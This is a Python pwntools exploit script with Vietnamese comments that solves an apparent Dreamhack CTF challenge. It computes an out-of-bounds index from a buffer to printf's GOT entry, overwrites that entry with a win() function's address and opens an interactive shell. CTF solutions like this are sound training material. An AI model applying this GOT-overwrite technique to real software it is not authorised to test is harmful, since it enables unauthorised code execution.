from pwn import *

# Chọn file binary
# Thay 'chall' bằng tên file thực thi của bạn
elf = context.binary = ELF('./prob')

# Bắt đầu một tiến trình mới
p = process()
p = remote('host1.dreamhack.games', 9755)

# Lấy các địa chỉ cần thiết từ file ELF
# pwntools tự động làm điều này cho chúng ta
printf_got_addr = elf.got['printf']
win_addr = elf.sym['win']

# Trong Ghidra/gdb, bạn cần tìm địa chỉ của 'buf'. Giả sử nó là 0x404080
# Bạn có thể tìm nó trong Symbol Tree của Ghidra hoặc mục .bss
buf_addr = elf.sym['buf'] # Hoặc nhập địa chỉ cứng nếu biết

# --- Bước 1: Tính toán và gửi chỉ số ---

# Tính chỉ số cần thiết để trỏ đến printf@got
index = (printf_got_addr - buf_addr) // 8

# Gửi chỉ số sau khi thấy dấu nhắc "val: "
log.info(f"Calculated index: {index}")
p.sendlineafter(b"val: ", str(index).encode())

# --- Bước 2: Gửi địa chỉ của hàm win ---

# Gửi địa chỉ của hàm win làm giá trị để ghi đè
log.info(f"Overwriting printf@got (0x{printf_got_addr:x}) with win_addr (0x{win_addr:x})")
p.sendlineafter(b"val: ", str(win_addr).encode())

# --- Bước 3: Nhận shell ---

# Chương trình sẽ gọi printf tiếp theo, nhưng thực chất là gọi win()
# Chuyển sang chế độ tương tác để sử dụng shell
log.success("Payload sent! You should have a shell now.")
p.interactive()